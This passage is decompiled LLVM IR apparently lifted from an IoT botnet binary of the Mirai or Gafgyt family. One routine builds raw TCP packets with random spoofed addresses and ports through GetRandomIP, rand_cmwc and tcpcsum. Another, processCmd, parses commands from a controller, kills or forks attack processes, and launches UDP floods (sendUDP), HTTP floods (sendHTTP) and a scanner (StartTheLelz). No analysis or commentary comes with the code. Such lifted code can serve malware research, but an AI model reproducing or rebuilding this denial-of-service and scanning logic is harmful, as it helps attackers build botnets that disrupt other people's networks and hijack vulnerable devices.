  %v0_d35c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_cf88, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_d368 = inttoptr i32 %v0_d35c to i32*
  %v7_d368 = call i32 @__libc_sendto(i32 %v0_ced8, i32* %v6_d368, i32 %v1_cf88, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_d370 = call i32 @GetRandomIP(i32 %storemerge10)
  store i32 %v1_d370, i32* %r3.global-to-local, align 4
  %v1_d37c = call i32 @htonl(i32 %v1_d370)
  store i32 %v1_d37c, i32* %r2.global-to-local, align 4
  store i32 %v3_cfb8, i32* %r3.global-to-local, align 4
  store i32 %v1_d37c, i32* %v3_d388, align 4
  %v0_d38c = call i32 @rand_cmwc()
  %v3_d398 = urem i32 %v0_d38c, 65536
  store i32 %v3_d398, i32* %r3.global-to-local, align 4
  store i32 %v3_cfb8, i32* %r2.global-to-local, align 4
  %v1_d3a0 = trunc i32 %v0_d38c to i8
  store i8 %v1_d3a0, i8* %v4_d3a0, align 4
  %v0_d3a4 = load i32, i32* %r3.global-to-local, align 4
  %v3_d3a4 = sdiv i32 %v0_d3a4, 256
  store i32 %v3_d3a4, i32* %r3.global-to-local, align 4
  %v1_d3a8 = trunc i32 %v3_d3a4 to i8
  %v2_d3a8 = load i32, i32* %r2.global-to-local, align 4
  %v3_d3a8 = add i32 %v2_d3a8, 5
  %v4_d3a8 = inttoptr i32 %v3_d3a8 to i8*
  store i8 %v1_d3a8, i8* %v4_d3a8, align 1
  %v0_d3ac = call i32 @rand_cmwc()
  store i32 %v0_d3ac, i32* %r2.global-to-local, align 4
  store i32 %v1_cfd8, i32* %r3.global-to-local, align 4
  store i32 %v0_d3ac, i32* %v3_d044, align 4
  %v0_d3bc = call i32 @rand_cmwc()
  %v3_d3c8 = urem i32 %v0_d3bc, 65536
  store i32 %v3_d3c8, i32* %r3.global-to-local, align 4
  store i32 %v1_cfd8, i32* %r2.global-to-local, align 4
  %v1_d3d0 = trunc i32 %v0_d3bc to i8
  store i8 %v1_d3d0, i8* %v5_cfdc, align 4
  %v0_d3d4 = load i32, i32* %r3.global-to-local, align 4
  %v3_d3d429 = udiv i32 %v0_d3d4, 256
  %v1_d3d8 = trunc i32 %v3_d3d429 to i8
  %v2_d3d8 = load i32, i32* %r2.global-to-local, align 4
  %v3_d3d8 = add i32 %v2_d3d8, 1
  %v4_d3d8 = inttoptr i32 %v3_d3d8 to i8*
  store i8 %v1_d3d8, i8* %v4_d3d8, align 1
  store i32 %v1_cfd8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i8 0, i8* %v4_d254, align 4
  store i8 0, i8* %v5_d3e8, align 1
  %v5_d3f4 = call i32 @tcpcsum(i32 %v3_cfb8, i32 %v1_cfd8, i32 %v1_cfd8, i32 0)
  %sext5 = mul i32 %v5_d3f4, 16777216
  %v1_d3f8 = sdiv i32 %sext5, 16777216
  store i32 %v1_d3f8, i32* %r3.global-to-local, align 4
  store i32 %v1_cfd8, i32* %r2.global-to-local, align 4
  %v1_d400 = trunc i32 %v1_d3f8 to i8
  store i8 %v1_d400, i8* %v4_d254, align 4
  %v0_d404 = load i32, i32* %r3.global-to-local, align 4
  %v3_d40430 = udiv i32 %v0_d404, 256
  %v1_d408 = trunc i32 %v3_d40430 to i8
  %v2_d408 = load i32, i32* %r2.global-to-local, align 4
  %v3_d408 = add i32 %v2_d408, 17
  %v4_d408 = inttoptr i32 %v3_d408 to i8*
  store i8 %v1_d408, i8* %v4_d408, align 1
  store i32 %v1_d2f0, i32* %r3.global-to-local, align 4
  %v2_d41c = load i8, i8* %v1_d2f4, align 2
  %v3_d41c = zext i8 %v2_d41c to i32
  store i32 %v3_d41c, i32* %r2.global-to-local, align 4
  %v3_d420 = load i8, i8* %v2_d2f8, align 1
  %v4_d420 = zext i8 %v3_d420 to i32
  %v4_d424 = mul nuw nsw i32 %v4_d420, 256
  %v5_d424 = or i32 %v4_d424, %v3_d41c
  store i32 %v5_d424, i32* %r3.global-to-local, align 4
  %v3_d430 = call i32 @csum(i8* %v4_d014, i32 %v5_d424)
  %sext6 = mul i32 %v3_d430, 16777216
  %v1_d434 = sdiv i32 %sext6, 16777216
  store i32 %v1_d434, i32* %r3.global-to-local, align 4
  store i32 %v3_cfb8, i32* %r2.global-to-local, align 4
  %v1_d43c = trunc i32 %v1_d434 to i8
  store i8 %v1_d43c, i8* %v4_d314, align 2
  %v0_d440 = load i32, i32* %r3.global-to-local, align 4
  %v3_d44031 = udiv i32 %v0_d440, 256
  %v1_d444 = trunc i32 %v3_d44031 to i8
  %v2_d444 = load i32, i32* %r2.global-to-local, align 4
  %v3_d444 = add i32 %v2_d444, 11
  %v4_d444 = inttoptr i32 %v3_d444 to i8*
  store i8 %v1_d444, i8* %v4_d444, align 1
  store i32 %stack_var_-88.0, i32* %r3.global-to-local, align 4
  %v9_d450 = icmp eq i32 %stack_var_-88.0, %arg7
  br i1 %v9_d450, label %dec_label_pc_d458, label %dec_label_pc_d47c

dec_label_pc_d458:                                ; preds = %dec_label_pc_d344
  %v2_d45c = call i32 @__GI_time(i32* null)
  store i32 %v2_d45c, i32* %r2.global-to-local, align 4
  store i32 %v2_d330, i32* %r3.global-to-local, align 4
  %v8_d46c = icmp sgt i32 %v2_d45c, %v2_d330
  br i1 %v8_d46c, label %dec_label_pc_d48c, label %dec_label_pc_d470

dec_label_pc_d470:                                ; preds = %dec_label_pc_d458
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d344

dec_label_pc_d47c:                                ; preds = %dec_label_pc_d344
  %v1_d480 = add i32 %stack_var_-88.0, 1
  store i32 %v1_d480, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d344

dec_label_pc_d48c:                                ; preds = %dec_label_pc_d458, %dec_label_pc_ce90, %dec_label_pc_cf3c, %dec_label_pc_cef0
  %v12_d494 = phi i32 [ %v3_cea0, %dec_label_pc_ce90 ], [ %v3_cf4c, %dec_label_pc_cf3c ], [ %v3_cf00, %dec_label_pc_cef0 ], [ %v2_d45c, %dec_label_pc_d458 ]
  store i32 %v3_ce04, i32* @r4, align 4
  store i32 %v6_ce04, i32* @fp, align 4
  ret i32 %v12_d494

; uselistorder directives
  uselistorder i32 %v1_d480, { 1, 0 }
  uselistorder i32 %v1_d434, { 1, 0 }
  uselistorder i32 %v1_d3f8, { 1, 0 }
  uselistorder i32 %v0_d3bc, { 1, 0 }
  uselistorder i32 %v3_d3a4, { 1, 0 }
  uselistorder i32 %v0_d38c, { 1, 0 }
  uselistorder i32 %stack_var_-88.0, { 0, 2, 1 }
  uselistorder i32 %v2_d330, { 1, 0, 2 }
  uselistorder i32 %v3_d318, { 1, 0 }
  uselistorder i32 %v1_d30c, { 1, 0 }
  uselistorder i32 %v1_d2f0, { 0, 2, 1 }
  uselistorder i32 %v1_d2d0, { 1, 0 }
  uselistorder i32 %v3_d2bc, { 2, 0, 1 }
  uselistorder i8 %v0_d278.sink.off0, { 1, 0 }
  uselistorder i32 %v3_d298, { 1, 0 }
  uselistorder i32 %v0_d278, { 1, 0 }
  uselistorder i32 %v0_d22c, { 1, 0 }
  uselistorder i32 %v2_d214, { 1, 0, 2 }
  uselistorder i32 %storemerge1421, { 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i8* %v2_d124, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i8* %v2_d098, { 1, 5, 2, 6, 3, 7, 4, 8, 0, 9 }
  uselistorder i32 %v3_d030, { 1, 0 }
  uselistorder i32 %v0_d018, { 1, 0 }
  uselistorder i32 %v1_cfd8, { 5, 7, 6, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 22, 21, 20, 19, 18, 0, 1, 2, 3, 4, 23, 24, 25, 26 }
  uselistorder i32 %v3_cfb8, { 12, 11, 10, 8, 6, 23, 9, 7, 4, 5, 22, 3, 21, 20, 19, 18, 17, 16, 24, 15, 14, 13, 2, 1, 0 }
  uselistorder i32 %v1_cf88, { 1, 0 }
  uselistorder i32 %v3_ce74, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32* %stack_var_-68, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 6, 7, 4, 5, 11, 12, 8, 9, 10, 13, 14, 15, 16, 17, 18, 19, 20, 21, 24, 25, 22, 23, 27, 28, 26, 29, 30, 31, 32, 33, 34, 35, 36, 37, 54, 38, 39, 41, 40, 42, 44, 43, 45, 47, 46, 48, 50, 49, 51, 53, 52, 83, 55, 56, 57, 58, 59, 60, 63, 61, 62, 64, 65, 66, 67, 69, 68, 70, 71, 72, 74, 73, 75, 76, 77, 79, 78, 80, 81, 82, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @tcpcsum, { 1, 0 }
  uselistorder i32 (i32)* @htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @GetRandomIP, { 3, 2, 1, 0 }
  uselistorder i32 ()* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg4, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_d48c, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_d2ac, { 1, 0 }
  uselistorder label %dec_label_pc_d20c, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_d104, { 1, 0 }
  uselistorder label %dec_label_pc_cf84, { 1, 0 }
  uselistorder label %dec_label_pc_ce90, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_d4c8 = load i32, i32* @r4, align 4
  %v6_d4c8 = load i32, i32* @r5, align 4
  %v9_d4c8 = load i32, i32* @r6, align 4
  %v12_d4c8 = load i32, i32* @r7, align 4
  %v15_d4c8 = load i32, i32* @r8, align 4
  %v18_d4c8 = load i32, i32* @fp, align 4
  store i32 54480, i32* %stack_var_-4, align 4
  %v2_d4cc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_d4cc, i32* @fp, align 4
  %v2_d4e0 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_193d8.50 to i32), i32* @r1, align 4
  %v3_d4ec = inttoptr i32 %v2_d4e0 to i8*
  %v4_d4ec = call i32 @__GI_strcoll(i8* %v3_d4ec, i32 ptrtoint ([5 x i8]* @global_var_193d8.50 to i32))
  %v2_d4f4 = icmp eq i32 %v4_d4ec, 0
  br i1 %v2_d4f4, label %dec_label_pc_d4fc, label %dec_label_pc_d514

dec_label_pc_d4fc:                                ; preds = %entry
  %v2_d500 = load i32, i32* @global_var_24170.48, align 4
  %v3_d50c = call i32 @Rootsprintf(i32 %v2_d500, i32 ptrtoint ([6 x i8]* @global_var_1974c.492 to i32))
  br label %dec_label_pc_e0b0

dec_label_pc_d514:                                ; preds = %entry
  %v2_d518 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_19754.494 to i32), i32* @r1, align 4
  %v3_d524 = inttoptr i32 %v2_d518 to i8*
  %v4_d524 = call i32 @__GI_strcoll(i8* %v3_d524, i32 ptrtoint ([6 x i8]* @global_var_19754.494 to i32))
  %v2_d52c = icmp eq i32 %v4_d524, 0
  br i1 %v2_d52c, label %dec_label_pc_d534, label %dec_label_pc_d628

dec_label_pc_d534:                                ; preds = %dec_label_pc_d514
  %v1_d538 = add i32 %tmp, 4
  %v1_d53c = inttoptr i32 %v1_d538 to i32*
  %v2_d53c = load i32, i32* %v1_d53c, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1975c.496 to i32), i32* @r1, align 4
  %v3_d548 = inttoptr i32 %v2_d53c to i8*
  %v4_d548 = call i32 @__GI_strcoll(i8* %v3_d548, i32 ptrtoint ([4 x i8]* @global_var_1975c.496 to i32))
  %v2_d550 = icmp eq i32 %v4_d548, 0
  br i1 %v2_d550, label %dec_label_pc_d558, label %dec_label_pc_d59c

dec_label_pc_d558:                                ; preds = %dec_label_pc_d534
  %v2_d55c = load i32, i32* @global_var_2a3f8.498, align 4
  %v2_d560 = icmp eq i32 %v2_d55c, 0
  br i1 %v2_d560, label %dec_label_pc_e0b0, label %dec_label_pc_d568

dec_label_pc_d568:                                ; preds = %dec_label_pc_d558
  %v0_d578 = call i32 @kill()
  %v2_d580 = load i32, i32* @global_var_24170.48, align 4
  %v3_d58c = call i32 @Rootsprintf(i32 %v2_d580, i32 ptrtoint ([14 x i8]* @global_var_19760.500 to i32))
  store i32 0, i32* @global_var_2a3f8.498, align 4
  br label %dec_label_pc_d59c

dec_label_pc_d59c:                                ; preds = %dec_label_pc_d534, %dec_label_pc_d568
  %v2_d5a4 = load i32, i32* %v1_d53c, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19770.502 to i32), i32* @r1, align 4
  %v3_d5b0 = inttoptr i32 %v2_d5a4 to i8*
  %v4_d5b0 = call i32 @__GI_strcoll(i8* %v3_d5b0, i32 ptrtoint ([3 x i8]* @global_var_19770.502 to i32))
  %v2_d5b8 = icmp eq i32 %v4_d5b0, 0
  br i1 %v2_d5b8, label %dec_label_pc_d5c0, label %dec_label_pc_d628

dec_label_pc_d5c0:                                ; preds = %dec_label_pc_d59c
  %v2_d5c4 = load i32, i32* @global_var_2a3f8.498, align 4
  %v2_d5c8 = icmp eq i32 %v2_d5c4, 0
  br i1 %v2_d5c8, label %dec_label_pc_d5d0, label %dec_label_pc_e0b0

dec_label_pc_d5d0:                                ; preds = %dec_label_pc_d5c0
  %v0_d5d0 = call i32 @__libc_fork()
  %v2_d5f0 = icmp eq i32 %v0_d5d0, 0
  br i1 %v2_d5f0, label %dec_label_pc_d614, label %dec_label_pc_d5f8

dec_label_pc_d5f8:                                ; preds = %dec_label_pc_d5d0
  store i32 %v0_d5d0, i32* @global_var_2a3f8.498, align 4
  br label %dec_label_pc_e0b0

dec_label_pc_d614:                                ; preds = %dec_label_pc_d5d0
  %v2_d61c = call i32 @StartTheLelz(i32 10, i32 1000)
  %v1_d624 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_d628:                                ; preds = %dec_label_pc_d59c, %dec_label_pc_d514
  %v2_d62c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_19774.504 to i32), i32* @r1, align 4
  %v3_d638 = inttoptr i32 %v2_d62c to i8*
  %v4_d638 = call i32 @__GI_strcoll(i8* %v3_d638, i32 ptrtoint ([5 x i8]* @global_var_19774.504 to i32))
  %v2_d640 = icmp eq i32 %v4_d638, 0
  br i1 %v2_d640, label %dec_label_pc_d648, label %dec_label_pc_d7bc

dec_label_pc_d648:                                ; preds = %dec_label_pc_d628
  %v7_d650 = icmp slt i32 %arg1, 6
  br i1 %v7_d650, label %dec_label_pc_e0b0, label %dec_label_pc_d654

dec_label_pc_d654:                                ; preds = %dec_label_pc_d648
  %v1_d658 = add i32 %tmp, 12
  %v1_d65c = inttoptr i32 %v1_d658 to i32*
  %v2_d65c = load i32, i32* %v1_d65c, align 4
  store i32 %v2_d65c, i32* @r0, align 4
  %v1_d664 = call i32 @atol(i32 %v2_d65c)
  %tmp88 = icmp slt i32 %v1_d664, 1
  br i1 %tmp88, label %dec_label_pc_e0b0, label %dec_label_pc_d674

dec_label_pc_d674:                                ; preds = %dec_label_pc_d654
  %v1_d678 = add i32 %tmp, 20
  %v1_d67c = inttoptr i32 %v1_d678 to i32*
  %v2_d67c = load i32, i32* %v1_d67c, align 4
  store i32 %v2_d67c, i32* @r0, align 4
  %v1_d684 = call i32 @atol(i32 %v2_d67c)
  %v5_d690 = icmp sgt i32 %v1_d684, 0
  br i1 %v5_d690, label %dec_label_pc_d698, label %dec_label_pc_e0b0

dec_label_pc_d698:                                ; preds = %dec_label_pc_d674
  %v0_d698 = call i32 @listFork()
  %v2_d6a0 = icmp eq i32 %v0_d698, 0
  br i1 %v2_d6a0, label %dec_label_pc_d6a8, label %dec_label_pc_e0b0

dec_label_pc_d6a8:                                ; preds = %dec_label_pc_d698
  %v2_d6ac = load i32, i32* @global_var_24170.48, align 4
  store i32 %v2_d6ac, i32* @r5, align 4
  %v1_d6b4 = add i32 %tmp, 4
  %v1_d6b8 = inttoptr i32 %v1_d6b4 to i32*
  %v2_d6b8 = load i32, i32* %v1_d6b8, align 4
  store i32 %v2_d6b8, i32* @r6, align 4
  %v1_d6c0 = add i32 %tmp, 8
  %v1_d6c4 = inttoptr i32 %v1_d6c0 to i32*
  %v2_d6c4 = load i32, i32* %v1_d6c4, align 4
  store i32 %v2_d6c4, i32* @r7, align 4
  %v2_d6d0 = load i32, i32* %v1_d65c, align 4
  store i32 %v2_d6d0, i32* @r0, align 4
  %v1_d6d8 = call i32 @atol(i32 %v2_d6d0)
  store i32 %v1_d6d8, i32* @r4, align 4
  %v2_d6e8 = load i32, i32* %v1_d67c, align 4
  store i32 %v2_d6e8, i32* @r0, align 4
  %v1_d6f0 = call i32 @atol(i32 %v2_d6e8)
  %v0_d700 = load i32, i32* @r5, align 4
  %v0_d708 = load i32, i32* @r6, align 4
  store i32 %v0_d708, i32* @r2, align 4
  %v3_d710 = call i32 @Rootsprintf(i32 %v0_d700, i32 ptrtoint ([38 x i8]* @global_var_1977c.506 to i32))
  %v2_d71c = load i32, i32* %v1_d6b8, align 4
  store i32 %v2_d71c, i32* @r5, align 4
  %v2_d72c = load i32, i32* %v1_d6c4, align 4
  store i32 %v2_d72c, i32* @r6, align 4
  %v2_d73c = load i32, i32* %v1_d65c, align 4
  store i32 %v2_d73c, i32* @r0, align 4
  %v1_d744 = call i32 @atol(i32 %v2_d73c)
  %v3_d750 = urem i32 %v1_d744, 65536
  store i32 %v3_d750, i32* @r7, align 4
  %v1_d75c = add i32 %tmp, 16
  %v1_d760 = inttoptr i32 %v1_d75c to i32*
  %v2_d760 = load i32, i32* %v1_d760, align 4
  store i32 %v2_d760, i32* @r8, align 4
  %v2_d770 = load i32, i32* %v1_d67c, align 4
  store i32 %v2_d770, i32* @r0, align 4
  %v1_d778 = call i32 @atol(i32 %v2_d770)
  store i32 %v1_d778, i32* @r4, align 4
  %v1_d784 = add i32 %tmp, 24
  %v1_d788 = inttoptr i32 %v1_d784 to i32*
  %v2_d788 = load i32, i32* %v1_d788, align 4
  store i32 %v2_d788, i32* @r0, align 4
  %v1_d790 = call i32 @atol(i32 %v2_d788)
  %v0_d798 = load i32, i32* @r4, align 4
  %v0_d7a0 = load i32, i32* @r5, align 4
  %v0_d7a4 = load i32, i32* @r6, align 4
  %v0_d7a8 = load i32, i32* @r7, align 4
  %v0_d7ac = load i32, i32* @r8, align 4
  %v6_d7b0 = trunc i32 %v0_d7a8 to i8
  %v7_d7b0 = call i32 @sendHTTP(i32 %v0_d7a0, i32 %v0_d7a4, i8 %v6_d7b0, i32 %v0_d7ac, i32 %v0_d798, i32 %v1_d790)
  %v1_d7b8 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_d7bc

dec_label_pc_d7bc:                                ; preds = %dec_label_pc_d628, %dec_label_pc_d6a8
  %v2_d7c0 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_197a4.508 to i32), i32* @r1, align 4
  %v3_d7cc = inttoptr i32 %v2_d7c0 to i8*
  %v4_d7cc = call i32 @__GI_strcoll(i8* %v3_d7cc, i32 ptrtoint ([4 x i8]* @global_var_197a4.508 to i32))
  %v2_d7d4 = icmp eq i32 %v4_d7cc, 0
  br i1 %v2_d7d4, label %dec_label_pc_d7dc, label %dec_label_pc_db3c

dec_label_pc_d7dc:                                ; preds = %dec_label_pc_d7bc
  %v7_d7e4 = icmp slt i32 %arg1, 6
  br i1 %v7_d7e4, label %dec_label_pc_d8fc, label %dec_label_pc_d7e8

dec_label_pc_d7e8:                                ; preds = %dec_label_pc_d7dc
  %v1_d7ec = add i32 %tmp, 12
  %v1_d7f0 = inttoptr i32 %v1_d7ec to i32*
  %v2_d7f0 = load i32, i32* %v1_d7f0, align 4
  store i32 %v2_d7f0, i32* @r0, align 4
  %v1_d7f8 = call i32 @atol(i32 %v2_d7f0)
  %v7_d800 = icmp eq i32 %v1_d7f8, -1
  br i1 %v7_d800, label %dec_label_pc_d8fc, label %dec_label_pc_d808

dec_label_pc_d808:                                ; preds = %dec_label_pc_d7e8
  %v1_d80c = add i32 %tmp, 8
  %v1_d810 = inttoptr i32 %v1_d80c to i32*
  %v2_d810 = load i32, i32* %v1_d810, align 4
  store i32 %v2_d810, i32* @r0, align 4
  %v1_d818 = call i32 @atol(i32 %v2_d810)
  %v7_d820 = icmp eq i32 %v1_d818, -1
  br i1 %v7_d820, label %dec_label_pc_d8fc, label %dec_label_pc_d828

dec_label_pc_d828:                                ; preds = %dec_label_pc_d808
  %v1_d82c = add i32 %tmp, 16
  %v1_d830 = inttoptr i32 %v1_d82c to i32*
  %v2_d830 = load i32, i32* %v1_d830, align 4
  store i32 %v2_d830, i32* @r0, align 4
  %v1_d838 = call i32 @atol(i32 %v2_d830)
  %v7_d840 = icmp eq i32 %v1_d838, -1
  br i1 %v7_d840, label %dec_label_pc_d8fc, label %dec_label_pc_d848

dec_label_pc_d848:                                ; preds = %dec_label_pc_d828
  %v1_d84c = add i32 %tmp, 20
  %v1_d850 = inttoptr i32 %v1_d84c to i32*
  %v2_d850 = load i32, i32* %v1_d850, align 4
  store i32 %v2_d850, i32* @r0, align 4
  %v1_d858 = call i32 @atol(i32 %v2_d850)
  %v7_d860 = icmp eq i32 %v1_d858, -1
  br i1 %v7_d860, label %dec_label_pc_d8fc, label %dec_label_pc_d868

dec_label_pc_d868:                                ; preds = %dec_label_pc_d848
  %v2_d870 = load i32, i32* %v1_d850, align 4
  store i32 %v2_d870, i32* @r0, align 4
  %v1_d878 = call i32 @atol(i32 %v2_d870)
  %v8_d884 = icmp sgt i32 %v1_d878, 65536
  br i1 %v8_d884, label %dec_label_pc_d8fc, label %dec_label_pc_d888

dec_label_pc_d888:                                ; preds = %dec_label_pc_d868
  %v2_d890 = load i32, i32* %v1_d850, align 4
  store i32 %v2_d890, i32* @r0, align 4
  %v1_d898 = call i32 @atol(i32 %v2_d890)
  store i32 %v1_d898, i32* @r2, align 4
  %v8_d8ac = icmp sgt i32 %v1_d898, 65500
  br i1 %v8_d8ac, label %dec_label_pc_d8fc, label %dec_label_pc_d8b0

dec_label_pc_d8b0:                                ; preds = %dec_label_pc_d888
  %v2_d8b8 = load i32, i32* %v1_d830, align 4
  store i32 %v2_d8b8, i32* @r0, align 4
  %v1_d8c0 = call i32 @atol(i32 %v2_d8b8)
  %v8_d8cc = icmp sgt i32 %v1_d8c0, 32
  br i1 %v8_d8cc, label %dec_label_pc_d8fc, label %dec_label_pc_d8d0

dec_label_pc_d8d0:                                ; preds = %dec_label_pc_d8b0
  %v7_d8d4 = icmp eq i32 %arg1, 7
  br i1 %v7_d8d4, label %dec_label_pc_d8dc, label %dec_label_pc_d914

dec_label_pc_d8dc:                                ; preds = %dec_label_pc_d8d0
  %v1_d8e0 = add i32 %tmp, 24
  %v1_d8e4 = inttoptr i32 %v1_d8e0 to i32*
  %v2_d8e4 = load i32, i32* %v1_d8e4, align 4
  store i32 %v2_d8e4, i32* @r0, align 4
  %v1_d8ec = call i32 @atol(i32 %v2_d8e4)
  %v5_d8f8 = icmp sgt i32 %v1_d8ec, 0
  br i1 %v5_d8f8, label %dec_label_pc_d914, label %dec_label_pc_d8fc

dec_label_pc_d8fc:                                ; preds = %dec_label_pc_d8dc, %dec_label_pc_d8b0, %dec_label_pc_d888, %dec_label_pc_d868, %dec_label_pc_d848, %dec_label_pc_d828, %dec_label_pc_d808, %dec_label_pc_d7e8, %dec_label_pc_d7dc
  %v2_d900 = load i32, i32* @global_var_24170.48, align 4
  %v3_d90c = call i32 @Rootsprintf(i32 %v2_d900, i32 ptrtoint ([113 x i8]* @global_var_197a8.510 to i32))
  br label %dec_label_pc_e0b0

dec_label_pc_d914:                                ; preds = %dec_label_pc_d8d0, %dec_label_pc_d8dc
  %v1_d918 = add i32 %tmp, 4
  %v1_d91c = inttoptr i32 %v1_d918 to i32*
  %v2_d91c = load i32, i32* %v1_d91c, align 4
  %v2_d92c = load i32, i32* %v1_d810, align 4
  store i32 %v2_d92c, i32* @r0, align 4
  %v1_d934 = call i32 @atol(i32 %v2_d92c)
  %v2_d948 = load i32, i32* %v1_d7f0, align 4
  store i32 %v2_d948, i32* @r0, align 4
  %v1_d950 = call i32 @atol(i32 %v2_d948)
  %v2_d964 = load i32, i32* %v1_d830, align 4
  store i32 %v2_d964, i32* @r0, align 4
  %v1_d96c = call i32 @atol(i32 %v2_d964)
  %v2_d980 = load i32, i32* %v1_d850, align 4
  store i32 %v2_d980, i32* @r0, align 4
  %v1_d988 = call i32 @atol(i32 %v2_d980)
  %v7_d99c = icmp slt i32 %arg1, 7
  br i1 %v7_d99c, label %dec_label_pc_d9bc, label %dec_label_pc_d9a0

dec_label_pc_d9a0:                                ; preds = %dec_label_pc_d914
  %v1_d9a4 = add i32 %tmp, 24
  %v1_d9a8 = inttoptr i32 %v1_d9a4 to i32*
  %v2_d9a8 = load i32, i32* %v1_d9a8, align 4
  store i32 %v2_d9a8, i32* @r0, align 4
  %v1_d9b0 = call i32 @atol(i32 %v2_d9a8)
  br label %dec_label_pc_d9c4

dec_label_pc_d9bc:                                ; preds = %dec_label_pc_d914
  br label %dec_label_pc_d9c4

dec_label_pc_d9c4:                                ; preds = %dec_label_pc_d9a0, %dec_label_pc_d9bc
  %storemerge8 = phi i32 [ 1000, %dec_label_pc_d9bc ], [ %v1_d9b0, %dec_label_pc_d9a0 ]
  %v7_d9d4 = icmp slt i32 %arg1, 8
  br i1 %v7_d9d4, label %dec_label_pc_d9f4, label %dec_label_pc_d9d8

dec_label_pc_d9d8:                                ; preds = %dec_label_pc_d9c4
  %v1_d9dc = add i32 %tmp, 28
  %v1_d9e0 = inttoptr i32 %v1_d9dc to i32*
  %v2_d9e0 = load i32, i32* %v1_d9e0, align 4
  store i32 %v2_d9e0, i32* @r0, align 4
  %v1_d9e8 = call i32 @atol(i32 %v2_d9e0)
  br label %dec_label_pc_da08

dec_label_pc_d9f4:                                ; preds = %dec_label_pc_d9c4
  br label %dec_label_pc_da08

dec_label_pc_da08:                                ; preds = %dec_label_pc_d9d8, %dec_label_pc_d9f4
  %storemerge7 = phi i32 [ 1000000, %dec_label_pc_d9f4 ], [ %v1_d9e8, %dec_label_pc_d9d8 ]
  %v7_da18 = icmp slt i32 %arg1, 9
  br i1 %v7_da18, label %dec_label_pc_da38, label %dec_label_pc_da1c

dec_label_pc_da1c:                                ; preds = %dec_label_pc_da08
  %v1_da20 = add i32 %tmp, 32
  %v1_da24 = inttoptr i32 %v1_da20 to i32*
  %v2_da24 = load i32, i32* %v1_da24, align 4
  store i32 %v2_da24, i32* @r0, align 4
  %v1_da2c = call i32 @atol(i32 %v2_da24)
  br label %dec_label_pc_da40

dec_label_pc_da38:                                ; preds = %dec_label_pc_da08
  br label %dec_label_pc_da40

dec_label_pc_da40:                                ; preds = %dec_label_pc_da1c, %dec_label_pc_da38
  %storemerge6 = phi i32 [ 0, %dec_label_pc_da38 ], [ %v1_da2c, %dec_label_pc_da1c ]
  %v2_da54 = call i32 @__GI_strchr(i32 %v2_d91c, i32 44)
  %v2_da5c = icmp eq i32 %v2_da54, 0
  br i1 %v2_da5c, label %dec_label_pc_daf0, label %dec_label_pc_da64

dec_label_pc_da64:                                ; preds = %dec_label_pc_da40
  store i32 %v2_d91c, i32* @r0, align 4
  %v2_da70 = call i32 @__GI_strtok(i32 %v2_d91c, i32 ptrtoint (i32* @global_var_19720.476 to i32))
  %v2_dae421 = icmp eq i32 %v2_da70, 0
  br i1 %v2_dae421, label %dec_label_pc_e0b0, label %dec_label_pc_da80

dec_label_pc_da80:                                ; preds = %dec_label_pc_da64, %dec_label_pc_dacc
  %storemerge1522 = phi i32 [ %v2_dad4, %dec_label_pc_dacc ], [ %v2_da70, %dec_label_pc_da64 ]
  %v0_da80 = call i32 @listFork()
  %v2_da88 = icmp eq i32 %v0_da80, 0
  br i1 %v2_da88, label %dec_label_pc_da90, label %dec_label_pc_dacc

dec_label_pc_da90:                                ; preds = %dec_label_pc_da80
  %v8_dac0 = call i32 @sendUDP(i32 %storemerge1522, i32 %v1_d934, i32 %v1_d950, i32 %v1_d96c, i32 %v1_d988, i32 %storemerge8, i32 %storemerge7, i32 %storemerge6)
  %v1_dac8 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_dacc:                                ; preds = %dec_label_pc_da80
  store i32 0, i32* @r0, align 4
  %v2_dad4 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_19720.476 to i32))
  %v2_dae4 = icmp eq i32 %v2_dad4, 0
  br i1 %v2_dae4, label %dec_label_pc_e0b0, label %dec_label_pc_da80

